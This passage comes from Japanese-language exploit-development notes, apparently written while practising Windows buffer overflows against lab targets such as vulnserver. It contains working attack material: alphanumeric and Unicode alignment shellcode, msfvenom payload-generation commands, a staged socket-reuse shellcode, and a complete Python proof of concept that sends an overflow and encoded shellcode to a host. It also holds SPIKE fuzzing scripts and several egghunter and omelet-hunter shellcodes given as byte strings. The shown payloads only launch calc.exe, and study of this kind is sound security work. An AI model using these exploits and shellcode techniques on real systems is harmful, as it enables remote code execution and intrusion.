0065 00  | ADD BYTE PTR SS:[EBP],AH
0e       | PUSH CS
0045 00  | ADD BYTE PTR SS:[EBP],AL

```
#### short jmpコードの作成
`esp`のアドレスの近くに、シェルコードに近いアドレスがあれば、それをEAXに代入して、ADD/SUBで調整してからpush,retしてジャンプできる。   
```python
# nasm > pop eax
# 00000000  58                pop eax
# nasm > add byte[ebp],CH                      <- こうすれば、"\x58\x6d"を入力するとこれらの命令を実行できる！
# 00000000  006D00            add [ebp+0x0],ch 

align = "\x58"  # pop eax     <- eaxに目標の値が代入されるまでpopする
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align

# nasm > add eax,0x11000100
# 00000000  0500010011        add eax,0x11000100 
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch
# nasm > sub eax,0x11002000                       eaxには([元のax]+0x0100-0x2000) がセットされる
# 00000000  2D00200011        sub eax,0x11002000  つまり、eaxを(0x100-0x2000分)減算できている！
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch

align += "\x05\x01\x11" # add eax,11000100
align += "\x6d" # nop
align += "\x2d\x20\x11" # sub eax,11002000
align += "\x6d" # nop

# nasm > push eax
# 00000000  50                push eax         調整したEAXをスタックにpush
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch
# nasm > ret                                   そのEAXにジャンプ！
# 00000000  C3                ret

jmp = "\x50" # push eax
jmp += "\x6d" # nop
jmp += "\xc3" # ret

```
上の方法だと、最低でも0x100バイト分の調整しかできないが、0xb0バイトの微調整がしたい場合、以下のようにやるといけた。   
```python
# nasm > mov ecx,0xaa005000
# 00000000  B9005000AA        mov ecx,0xaa005000
# nasm > add al,ch
# 00000000  00E8              add al,ch
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch
#>>> hex(0x100 - 0xb0)                         目標は0012de58 -> 0012dda8 !!!
#'0x50'                                        0xdeと0x58を両方変更する必要があるため
                                               add al,chみたいなのを2回行う
# eax=0012de58 -> 0012dea8 (add 0x50)      [1] まずは最下位１バイト(al)にadd al,chすることで、
align += "\xb9\x50\xaa\xe8\x6d"                0x58 + 0x50 = 0xa8 とする！


# nasm > mov ecx,0xaa007e00
# 00000000  B9007E00AA        mov ecx,0xaa007e00 次は0xde->0xddのため -1 する。
# nasm > add ch,ch                               つまり、0xffを加算するのに等しい。
# 00000000  00ED              add ch,ch          0xffは0x7fよりも大きいため0x00ffとは変換されないかも
# nasm > add ah,ch                               なので、0xff=ox7e*2+0x3 に分割してADDする
# 00000000  00EC              add ah,ch       [*] 多分0xffは大丈夫っぽい…
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch
# nasm > mov ecx,0xaa000300
# 00000000  B9000300AA        mov ecx,0xaa000300
# nasm > add ah,ch
# 00000000  00EC              add ah,ch
# nasm > add byte[ebp],CH
# 00000000  006D00            add [ebp+0x0],ch

# eax=0012dea8 -> 0012dda8 (add 0xff) 
align += "\xb9\x7e\xaa\xed\xec\x6d\xb9\x03\xaa\xec\x6d"
```
#### Unicode対応のPayloadの作成
メモリ内のどこかに、ShellcodeがASCIIで保存されるなら、以下みたいなのは必要ないが、そうはならず、Unicode変換されたものしかない場合は以下のようにして専用のPayloadを作成する。   
これは、Unicode変換されて、0x00が付与されることを前提としているため、変換されなければ意味をなさない命令となってしまうことに注意   
動いたものは以下の二つ。これら以外にもあるかもしれないが、少なくとも以下は正常に動作した。   

- `python /opt/alpha3/ALPHA3.py x86 utf-16 uppercase eax --input="calc.bin"  --verbose`   
動作は以下の説明と同じ。   
1000バイトくらい。でかい。   
動作検証済み(calc.exeが起動したのを見た)   
- `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX -f py`   
500バイトくらい。   
シェルコード実行前にEAXにそのシェルコードの先頭アドレスを保存できている場合、`BufferRegister=EAX`を指定する。   
すると、シェルコードの実行してすぐの処理の、「現在位置をスタック上に保存することでデコーダの場所を特定する」処理が
必要なくなる！   
入力がunicodeに変換されるとき、上記のエンコーダーを使える。   
動作検証済み(calc.exeが起動したのを見た)   

### staged-shellcoding
#### socket reuse
自由に使えるバッファが66バイトくらいしかない場合でも、`ws2_32.recv`関数を呼びだして追加のpayloadを任意のアドレスに挿入して実行することができる。   
`ws2_32.recv`に必要なサイズは25バイト前後くらい？   
```txt
ws2_32.recv関数を実行する直前にスタックを以下のようにしておく！

int recv(
  SOCKET s,       # socket file descriptor
  char   *buf,    # 受信したデータを格納するアドレス
  int    len,     # 格納するバッファのサイズ
  int    flags    # 0x00000000にすればよい？？よくわからん
);
```
`ws2_32.recv`を呼び出しているであろう実行ファイルまたはDLLに、`CPUで右クリック [View] `で移動する。   
そして、右クリックで`[Search for] -> [All intermodular calls]`で呼び出しの一覧を表示して、`ws2_32.recv`を呼び出す命令のあるアドレスを確認する。(`ws2_32.recv`自体のアドレスではない)   
![image](https://user-images.githubusercontent.com/56021519/85951768-3c8cfc80-b9a0-11ea-87ee-1901cba98b81.png)   
そのアドレスに移動して、右クリックで`[Assemble]`で`ws2_32.recv`関数のアドレスを表示する。   
![image](https://user-images.githubusercontent.com/56021519/85951778-4b73af00-b9a0-11ea-978f-d514dcdc7010.png)   
ここ(`0x00401953`)にbrakeをセットして実行すると、停止したときのスタックは以下のようになる。   
この時のSocket File Descriptor(`0x00000058`)は動的であり、プログラム起動ごとに変わるため、この値をstaged shellcode実行時に参照しなければならない。   
staged shellcode実行時にレジスタにこの値が保存されていればラッキー。なければ、スタック上などから探す必要がある。   
![image](https://user-images.githubusercontent.com/56021519/85951818-a86f6500-b9a0-11ea-8b37-ff9bb12235b1.png)   

これらの情報から、staged shellcodeは以下のようになる。   
```txt
global _start

section .text

_start:

push eax   ; espを低いアドレスにセットしないどshellcodeを破壊しかねない
pop esp    ; eaxに低いアドレスが入っていたためそれをespに代入する

push edx    ; edxに0x00000000が入っていたためflagに使う。逆順にpushするのに注意
add dh,0x2  ; lenを0x200(512)バイトに設定
push edx    ; lenをpush
add al,0x40 ; recvしたものを格納するアドレスを設定
            ; ある程度の場所に設定する
push eax    ; *bufをpush
push ebx    ; ebxにSocket File Descriptorが入っていたためそれをpushする
mov eax,0x40252c11  ; eaxに0x0040252cを代入したいが、NULLbytesがあるため右ビットシフトで解決する
shr eax,8
call eax            ; ws2_32.recv関数のアドレスにjmpして実行
                    ; データを受信すると*bufに上書きし、このcall eaxの続きから実行を再開する
                    ; そのため、nopで埋めておくとよさそう。
                    ; 1秒くらいSleepしないと受信できなかったので要注意！！！
```
PoC   
```python
import sys
import time
import socket
host = "192.168.56.6"
port = 9999

badheader = "KSTET ."
baddata = b"A"

# stage shellcode. jmp to ws2_32.recv
baddata += "\x50\x5c\x52\x80\xc6\x02\x52\x04\x40\x50\x53\xb8\x11\x2c\x25\x40\xc1\xe8\x08\xff\xd0"

baddata += "\x90"*(69-len(baddata))

baddata += "\xaf\x11\x50\x62" # jmp esp

#nasm > jmp $-0x48
#00000000  EBB6              jmp short 0xffffffb8
baddata += "\xeb\xb6"      # jmp to stage shellcode

baddata += "B"*(1000 - len(baddata))

# msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f py
buf =  b""
buf += b"\x89\xe2\xd9\xc8\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x38\x68\x6d"
buf += b"\x52\x47\x70\x45\x50\x55\x50\x65\x30\x4b\x39\x59\x75"
buf += b"\x34\x71\x59\x50\x61\x74\x6e\x6b\x32\x70\x34\x70\x6c"
buf += b"\x4b\x32\x72\x54\x4c\x4e\x6b\x66\x32\x54\x54\x4c\x4b"
buf += b"\x52\x52\x64\x68\x36\x6f\x48\x37\x71\x5a\x54\x66\x64"
buf += b"\x71\x49\x6f\x4e\x4c\x67\x4c\x43\x51\x51\x6c\x57\x72"
buf += b"\x54\x6c\x51\x30\x4a\x61\x68\x4f\x66\x6d\x47\x71\x79"
buf += b"\x57\x68\x62\x5a\x52\x51\x42\x52\x77\x6c\x4b\x42\x72"
buf += b"\x64\x50\x4c\x4b\x73\x7a\x45\x6c\x6c\x4b\x42\x6c\x67"
buf += b"\x61\x72\x58\x59\x73\x71\x58\x66\x61\x6a\x71\x66\x31"
buf += b"\x4e\x6b\x46\x39\x47\x50\x75\x51\x68\x53\x4e\x6b\x51"
buf += b"\x59\x67\x68\x78\x63\x77\x4a\x42\x69\x6e\x6b\x46\x54"
buf += b"\x4e\x6b\x66\x61\x69\x46\x65\x61\x6b\x4f\x4e\x4c\x7a"
buf += b"\x61\x7a\x6f\x66\x6d\x47\x71\x7a\x67\x46\x58\x6b\x50"
buf += b"\x33\x45\x48\x76\x74\x43\x31\x6d\x58\x78\x45\x6b\x73"
buf += b"\x4d\x46\x44\x50\x75\x68\x64\x43\x68\x4c\x4b\x50\x58"
buf += b"\x46\x44\x73\x31\x39\x43\x71\x76\x6e\x6b\x36\x6c\x70"
buf += b"\x4b\x6e\x6b\x70\x58\x65\x4c\x43\x31\x6b\x63\x4e\x6b"
buf += b"\x57\x74\x6c\x4b\x66\x61\x6e\x30\x6e\x69\x30\x44\x57"
buf += b"\x54\x44\x64\x63\x6b\x51\x4b\x75\x31\x63\x69\x43\x6a"
buf += b"\x32\x71\x59\x6f\x39\x70\x33\x6f\x63\x6f\x33\x6a\x4c"
buf += b"\x4b\x77\x62\x5a\x4b\x4c\x4d\x63\x6d\x31\x7a\x47\x71"
buf += b"\x6c\x4d\x6f\x75\x58\x32\x55\x50\x53\x30\x53\x30\x66"
buf += b"\x30\x75\x38\x34\x71\x4c\x4b\x52\x4f\x4f\x77\x6b\x4f"
buf += b"\x59\x45\x4f\x4b\x5a\x50\x4c\x75\x6f\x52\x63\x66\x43"
buf += b"\x58\x4c\x66\x7a\x35\x6f\x4d\x6d\x4d\x59\x6f\x49\x45"
buf += b"\x45\x6c\x67\x76\x33\x4c\x44\x4a\x4b\x30\x49\x6b\x4d"
buf += b"\x30\x32\x55\x47\x75\x4d\x6b\x61\x57\x64\x53\x71\x62"
buf += b"\x52\x4f\x31\x7a\x37\x70\x42\x73\x79\x6f\x69\x45\x71"
buf += b"\x73\x43\x51\x72\x4c\x42\x43\x76\x4e\x35\x35\x50\x78"
buf += b"\x45\x35\x65\x50\x41\x41"

print("Sending payload....")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
s.send(badheader + baddata)

# very important!!!!!!!!!!
time.sleep(2)

s.send(buf)
s.close()
```
#### 新規socket作成
FTPサーバーなどが対象の場合、攻撃者とソケットが作成されておりそのソケットを使用して`s.recv`で追加のPayloadを注入するが、クライアント側から`s.close`でソケットを閉じないとEIPを操作できない(Stack上コード実行が始まらない)場合、ソケットの再利用ができない。   
その場合は新たにソケットを`socket(),bind(),listen(),accept,recv()`の順に作成すれば解決する！   
例）https://buffered.io/posts/idsecconf-2013-myftpd-challenge/   
```txt
# socket() socket新規作成する
           socket()を実行した段階ではソケットが作られただけであり、ポー ト番号などは未確定
           int socket(int domain, int type, int protocol); 
           
# bind()   socket登録
           生成したソケットにポート番号など割り当て
           int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
           
# listen() ソケット接続準備
           通信接続を待つための準備作業
           int listen(int sockfd, int backlog);
           
# accept() ソケット接続待機
           クライアント側からの通信接続を待つ。サーバ側プログラムが accept()を実行すると、
           クライアント側からの通信接続要求が来るまでプログラムが停止し、接続後にプログラムを再開
           int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
           
# recv()   データ受信
　　　　　　ssize_t read(int fd, void *buf, size_t count);

```
### fuzzing (SPIKE)
#### 基本
参考文献   
https://resources.infosecinstitute.com/intro-to-fuzzing/   

コマンド自体をfuzzingしたいとき以下のようにする。   
1回目は`COMMAND`を送信するが、次からは`/../AAAAAAAA...`みたいなのをいろいろ送信してくれる。   
`generic_send_tcp 192.168.56.6 9999 vscommand.spk 0 0`   
で実行する。   
```C
s_readline(); //print received line from server
s_string_variable("COMMAND"); // send fuzzed string
```
コマンドのパラメータ(引数)でfuzzingしたいとき以下のようにする。   
```C
printf("HELP 00help.spk"); // print to terminal command and filename

s_readline(); // print received line from server

s_string("HELP "); // send "HELP" to program

s_string_variable("COMMAND"); // send fuzzed string
```
複数のコマンドのパラメータをfuzzingしたいときは、各コマンドごとに`.spk`ファイルを作成しておき、それらを実行するファイルを作成する。   
```txt
root@kali:/fuzz/vulnserver# ls
00help.spk   02rtime.spk  04srun.spk  06gmon.spk  08kstet.spk  trun-fuzz.txt
01stats.spk  03ltime.spk  05trun.spk  07gdog.spk  fuzzer.pl    vscommand.spk
```
`perl fuzzer.pl 192.168.56.6 9999 8 0 0`   
で実行する。一つ目の8は`08kstet.spk`以降の`.spk`ファイルを実行するということ。(`00~07`を省略)   
```perl
#!/usr/bin/perl
# Simple wrapper to run multiple .spk files using generic_send_tcp

$spikese = 'generic_send_tcp';

if ($ARGV[4] eq '') {
die("Usage: $0 IP_ADDRESS PORT SKIPFILE SKIPVAR SKIPSTR\n\n");
}

$skipfiles = $ARGV[2];

@files = <*.spk>;

foreach $file (@files) {
if (! $skipfiles) {
if (system("$spikese $ARGV[0] $ARGV[1] $file $ARGV[3] $ARGV[4]") ) {
print "Stopped processing file $file\n";
exit(0);
}
} else {
$skipfiles--;
}
}
```
#### ソケット通信時のパケット
ftp serverに以下のスクリプトで通信する際のパケットの様子を理解する。正常時のモノと比較することでデバッグする。   
```python
import sys
import socket
host = "192.168.56.38"
port = 21

baddata = "A"

print("Sending payload....")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))

s.recv(1024) # recv banner
s.send(baddata + "\r\n")
s.close()
```
まず最初に、   
```python
connect = s.connect((host,port))
```
までを実行すると以下のようになる(connectも実行する)   
ここで、TCP 3way-handshakeとbannerをserverから取得していることが確認できる！   
![image](https://user-images.githubusercontent.com/56021519/86508092-412a3880-be18-11ea-9824-ef5cd6373281.png)   
```txt
Seq = 受信したACKの番号
ACK = 受信したSeq + 受信したデータサイス

client                server
    |    Seq=0          |
    |   ===========>    |   clientからserverに接続を開始
    |       SYN         |   cli「接続始めるよ。届いた？」
    |                   |    
    |    Seq=0,Ack=1    |   
    |   <===========    |   server「届いたよ。届いた？」
    |     SYN ACK       |
    |                   |
    |    Seq=1,ACK=1    |
    |   ===========>    |   3way-handshake終了。
    |        ACK        |   cli「届いたよ。」
    |                   |
    |    Seq=1,ACK=1    |
    |   <===========    |   FTPServerのbannerを送信
    |   Response(42)    |   42バイトのデータを返信
    |                   |
    |    Seq=1,ACK=43   |   ACK = 1 + 42
    |   ============>   |   Seq = 受信したACK(=1)
    |       ACK         |   cli「banner受け取ったよ」
    |                   |
```
つぎに、   
```python
s.recv(1024) # recv banner
s.send(baddata + "\r\n")
```
までを実行する。recv()はclientにあるソケット通信の受信バッファからデータを取り出すだけなので、パケットは関係ない。   
![image](https://user-images.githubusercontent.com/56021519/86508429-fd84fe00-be1a-11ea-9ef6-1e939494d25e.png)   
```txt
Seq = 受信したACKの番号
ACK = 受信したSeq + 受信したデータサイス

client                server
    |   Seq=1,ACK=43    |
    |   ===========>    |   send("A")
    |    Request(3)     |   "A"に改行文字\r\n("\x0a\x0d")を足して3バイトを送信 
    |                   |    
    |   Seq=43,Ack=4    |   
    |   <===========    |   ACKとしてResponseデータヲ返信   
    |   Response(33)    |   "Command A not found"的なやつ
    |                   |
    |   Seq=4,ACK=76    |   ACK(76) = 受信したSeq(43)+受信したデータ(33)
    |   ===========>    |    
    |        ACK        |    
    |                   |
```
最後に、
```python
s.close()
```
通信をRSTで終了する。   
![image](https://user-images.githubusercontent.com/56021519/86508605-52754400-be1c-11ea-8154-4cb779fc15ad.png)   
```txt
client                server
    |    Seq=4,ACK=76   |
    |   ===========>    |   clientからserverに接続強制終了
    |     RST ACK       |  
```
#### generic_send_tcp
generic_send_tcpを使うと、通信するごとに切断する。   
```C
s_string("HOST ");
s_string_variable("192.168.1.108");
s_string("\r\n");

s_read_packet();
sleep(1);
s_read_packet();
```
上記をFTPserverに対して実行すると以下のようになった。   
![image](https://user-images.githubusercontent.com/56021519/86508733-61102b00-be1d-11ea-910c-bf29e24524f2.png)   
ここで大事なのは、Server側がACKをちゃんと返している点である。   
```txt
(8) 短い入力に対してはResponseで応答している。   
(10) そしてACKが返ってきたのでSPIKE側からRSTを送信して通信切断   

(17) 長い入力に対しては、ACKで応答している。   
(18) その長い入力をServer側で処理する際に異常を検知して、今度はServer側からRSTを送信して通信切断   
```
また、`sleep(1)`が入る場所が、bannerを取得してから`Request`を送信するまでの間であることも注意！！一定時間接続がないと異常と判断するようなアプリ(kolibri httpserverがそうだった)ではスリープする長さが重要！   

また、generic_send_tcpの場合は`s_read_packet();`でbannerを取得することはできてもResponseはなぜか取得できてないっぽい？？   


一方、以下のようなスクリプトを使用するとなぜかSPIKE側が変な動作をする。(ソースコードを読んだりしたが原因はわからなかった)   
```C
s_string("HOST ");
s_string_variable("192.168.1.108");
s_string("\r\n");

sleep(1);
```
![image](https://user-images.githubusercontent.com/56021519/86508881-8c474a00-be1e-11ea-979d-9ae0fb7ab6ee.png)   
```txt
(23) Requestを送信するとこまでは同じ。おそらく送信する内容も同じ   
(24) しかし、送信した後すぐにSPIKEがRSTを送信して通信を切断している！
これによって、仮にCrashを引き起こす入力が送信されており、Server側のソケット通信の受信バッファに格納されていても、
RSTが来ることでアプリケーションに渡す前に破棄してしまう！！   
```
Wiresharkを見る限り、パケットが来ているように見えるのにクラッシュしない原因はおそらくこれ！！   

ちなみに、`sleep();`を入れなくてもSPIKEは問題なく動作する。Server側の処理が遅すぎてリクエストをさばききれないとかじゃない限りクラッシュできそう。でも、Wiresharkの通信がぐっちゃぐちゃになるのでクラッシュを引き起こした原因を特定するのが面倒?。   

#### generic_web_server_fuzz2
generic_web_server_fuzz2はgeneric_web_server_fuzzの上位互換っぽい(ソースコードを見る限り)ので２の方を使った方がよさそう。   
https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE/src   

以下を使う。   
```C
s_string("HOST ");
s_string_variable("192.168.1.108");
s_string("\r\n");

s_read_packet();
sleep(1);
s_read_packet();
```
以下の通り、リクエストごとに通信を切断していない。`s_read_packet();`でちゃんと表示できることもあるけどできないこともあるっぽい？   
![image](https://user-images.githubusercontent.com/56021519/86509122-abdf7200-be20-11ea-9fed-961b3d2261c2.png)   
generic_send_tcpの時と同様、異常な入力をするとServer側のデータの処理時に異常を検知してSPIKEに対してRSTを送信して通信を切断する。generic_web_server_fuzz2の場合はSPIKEから自発的にRSTを送信して切断することはなさそう。   

#### wireshark
- `tcp.port == 9999 and tcp.flags.syn == 1 and ip.dst == 192.168.56.5`   
- `tcp.port == 9999 and ip.dst == 192.168.56.5`   
- `[Edit] [Find Packet] [String] [Packet bytes] [Narrow & Wide]`   
bannerである`Welcome`という文字列を検索して、それが返ってこなくなった時に送信されたfuzzdataからいつの入力で落ちたのか特定できる。   

### Egg-Hunter
Egg hunter using SEH injection   
```txt
# Egg hunter size = 60 bytes, Egg size = 8 bytes
EB21       jmp short 0x23
59         pop ecx
B890509050 mov eax,0x50905090  ; this is the tag
51         push ecx
6AFF       push byte -0x1
33DB       xor ebx,ebx
648923     mov [fs:ebx],esp
6A02       push byte +0x2
59         pop ecx
8BFB       mov edi,ebx
F3AF       repe scasd
7507       jnz 0x20
FFE7       jmp edi
6681CBFF0F or bx,0xfff
43         inc ebx
EBED       jmp short 0x10
E8DAFFFFFF call 0x2
6A0C       push byte +0xc
59         pop ecx
8B040C     mov eax,[esp+ecx]
B1B8       mov cl,0xb8
83040806   add dword [eax+ecx],byte +0x6
58         pop eax
83C410     add esp,byte+0x10
50         push eax
33C0       xor eax,eax
C3         ret

egghunter = "\xeb\x21\x59\xb8"
egghunter += "w00t"
egghunter += "\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb"
egghunter += "\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb"
egghunter += "\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
egghunter += "\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"
```
Egg hunter using IsBadReadPtr   
```txt
# Egg hunter size = 37 bytes, Egg size = 8 bytes
33DB       xor ebx,ebx
6681CBFF0F or bx,0xfff
43         inc ebx
6A08       push byte +0x8
53         push ebx
B80D5BE777 mov eax,0x77e75b0d
FFD0       call eax
85C0       test eax,eax
75EC       jnz 0x2
B890509050 mov eax,0x50905090 ; this is the tag
8BFB       mov edi,ebx
AF         scasd
75E7       jnz 0x7
AF         scasd
75E4       jnz0x7
FFE7       jmp edi

egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08"
egghunter += "\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8"
egghunter += "w00t"
egghunter += "\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
```
Egg hunter using NtDisplayString   
```txt
# Egg hunter size = 32 bytes, Egg size = 8 bytes
6681CAFF0F  or dx,0x0fff
42          inc edx
52          push edx
6A43        push byte +0x43   ; NtDisplayStringのsyscall番号
58          pop eax
CD2E        int 0x2e
3C05        cmp al,0x5
5A          pop edx
74EF        jz 0x0
B890509050  mov eax,0x50905090  ; this is the tag
8BFA        mov edi,edx
AF          scasd
75EA        jnz 0x5
AF          scasd
75E7        jnz 0x5
FFE7        jmp edi

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t"
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
```
Egg hunter using NtAccessCheck (AndAuditAlarm)   
```txt
前提条件：
edxはタグを探索するアドレスを順次入れていくので、初期化されているorスタックのアドレスなどの必要がある。
popadとかで変な値が入っている場合はxor edx,edxで初期化命令をegghunterのはじめに追加する必要がある。

# Egg hunter size = 32 bytes, Egg size = 8 bytes
6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
                           ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
                           ; 初めにedxが0で初期化されていない場合、xor edx,edxで初期化する必要がある場合がある
                           ; popadをしまくった結果edxに0x41414141とかが入っていると0x41414fffから探し始めてしまうので注意！
42          inc edx        ; acts as a counter
                           ;(increments the value in EDX)
52          push edx       ; pushes edx value to the  stack
                           ;(saves our current address on the stack)
                           ; このedxの値が、syscallによって読み込み権限があるか確認するアドレス
                           ; 権限がない(Access-violationが発生)と、0x1000足して次のアドレスの権限を確認を繰り返す。
6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
                           ; or 0x43 for NtDisplayString to stack
                           ; syscallの番号。カーネルモードでアドレスの値を参照して権限を確認する。
                           ; 文字列へのポインタを引数にとり、読み込もうとするsyscallの関数を使う。
58          pop eax        ; pop 0x2 or 0x43 into eax
                           ; so it can be used as parameter
                           ; to syscall - see next
                           ; syscallの番号はeaxに代入しておく。
CD2E        int 0x2e       ; tell the kernel i want a do a
                           ; syscall using previous register
                           ; カーネルモードでKiSystemService関数を呼びだす。
                           ; この関数が、syscall番号に対応する関数(NtAccessCheckAndAuditAlarmなど)を呼び出す
3C05        cmp al,0x5     ; check if access violation occurs
                           ;(0xc0000005== ACCESS_VIOLATION) 5
                           ; Access-Violationが発生すると、読み込み権限がないので、そもそもeggがあるかすら確認できない
5A          pop edx        ; restore edx
74EF        je xxxx        ; jmp back to start dx 0x0fffff
B890509050  mov eax,0x50905090 ; this is the tag (egg)
8BFA        mov edi,edx    ; set edi to our pointer
AF          scasd          ; compare for status. 「ediから読み込んだ値」と「eaxの値」を比較
                           ; edi(0x1000とか)から読み込んだ値とeax(egg)の値を比較
                           ; 比較したあと、edi+0x4される。つまり、2つ目の4バイトのeggを指すようになる。
75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
                           ; eggが見つからなければjmpする
AF          scasd          ; when egg has been found
                           ; 比較後は、2つ目の4バイトのeggから、次の4バイト後のshellcodeを指すようになる
75E7        jnz xxxxx      ; (jump back to "inc edx")
                           ; if only the first egg was found
FFE7       jmp edi         ; edi points to begin of the shellcode

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
```
**encoded egghunter**  
ファイル名に使えるような文字しか使えない場合、egghunterはこのままではだめなのでEncodeしたものを使う必要がある。  
Encodeされたenc_egghunterを実行したあとは以下のようにして、復元したegghunterを実行するようにする。   
```txt
enc_egghunter実行前
|               |
| enc_egghunter | <- eip  eipはenc_egghunterを指しているようにする 
|      nop      |
|      nop      | <- esp  espを基準に復元されたものがpushされるので、余裕をもった後方に設定する
|      nop      |

enc_egghunter実行後(元のegghunterを復元後)
|               |
| enc_egghunter | 
|      nop      | <- eip  enc_egghunter実行後、NOPスレッドに突入する
|   egghunter   | <- 復元されたEgghunterが現れる！このままNOPを降りていくとここを実行するようになる 
|      nop      |
```
```python
#nasm > jae $+0x23
#00000000  7321              jnc 0x23

# offset + jmp forward + poppopret + nop
payload = "A"*294 + "\x73\x21\x41\x41" + "\x7b\x46\x7e\x6d" + "\x41"*0x30
# popad + enc_egghunter + nop
# enc_egghunterを実行する前にpopadでespをenc_egghunterの存在するより下の方に設定する。
# すると、元のegghunterを再現し終わり、NOPを実行し、再現したegghunterにたどり着く
payload = payload + "\x61"*64 + enc_egghunter + "\x41"*500

# tag is "\x80\x81\x82\x83". not using 0x21-0x7f because corrupted shellcode in stack is trigared
# "w00t"をタグに設定すると、スタック上にも"w00t"が存在することになりそっちのShellcodeが実行されることになる
# しかし、実際に実行したいのはShellcodeが壊れていないHeapにあるShellcodeなので、あえてスタック上のタグが壊れるようにする
payload = payload + "\x80\x81\x82\x83"*2 + buf
```

### Omlet-Hunter   
- `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
`calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
omlet-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   

```C
// This is the binary code that needs to be executed to find the eggs, 
// recombine the orignal shellcode and execute it. It is 82 bytes:
omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDB\x31\xC0\x64\xFF\x50\x08";

// These are the eggs that need to be injected into the target process 
// for the omelet shellcode to be able to recreate the original shellcode
// (you can insert them as many times as you want, as long as each one is
// inserted at least once). They are 90 bytes each:
egg0 = "\x55\xFF\x55\xDA\xBA\xB8\x7A\x1D\x40\xC4\xDB\xDF\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x31\x83\xC3\x04\x31\x43\x0F\x03\x43\x75\xFF\xB5\x38\x61\x7D\x35\xC1\x71\xE2\xBF\x24\x40\x22\xDB\x2D\xF2\x92\xAF\x60\xFE\x59\xFD\x90\x75\x2F\x2A\x96\x3E\x9A\x0C\x99\xBF\xB7\x6D\xB8\x43\xCA\xA1\x1A\x7A\x05\xB4\x5B\xBB\x78\x35\x09\x14\xF6\xE8\xBE\x11\x42\x31\x34\x69\x42\x31\xA9\x39";
egg1 = "\x55\xFE\x55\xDA\xBA\x65\x10\x7C\x32\x3C\xB2\x7E\x97\x34\xFB\x98\xF4\x71\xB5\x13\xCE\x0E\x44\xF2\x1F\xEE\xEB\x3B\x90\x1D\xF5\x7C\x16\xFE\x80\x74\x65\x83\x92\x42\x14\x5F\x16\x51\xBE\x14\x80\xBD\x3F\xF8\x57\x35\x33\xB5\x1C\x11\x57\x48\xF0\x29\x63\xC1\xF7\xFD\xE2\x91\xD3\xD9\xAF\x42\x7D\x7B\x15\x24\x82\x9B\xF6\x99\x26\xD7\x1A\xCD\x5A\xBA\x70\x10\xE8\xC0\x36\x12";
